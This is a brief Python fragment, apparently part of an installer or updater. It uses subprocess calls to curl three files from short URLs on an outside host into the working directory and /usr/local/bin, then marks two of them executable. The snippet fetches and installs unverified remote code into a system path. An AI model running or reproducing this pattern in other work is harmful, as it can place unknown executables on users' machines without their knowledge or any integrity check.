...
subprocess.run(["curl", "-L", "https://yaso.su/garouup", "-o", ".garougup.py"])
subprocess.run(["curl", "-L", "https://yaso.su/raw/garougupc", "-o", "/usr/local/bin/up"])
subprocess.run(["curl", "-L", "https://yaso.su/raw/cwlhostg", "-o", "/usr/local/bin/g"])
subprocess.run(["chmod", "+x", "/usr/local/bin/up"])
subprocess.run(["chmod", "+x", "/usr/local/bin/g"])
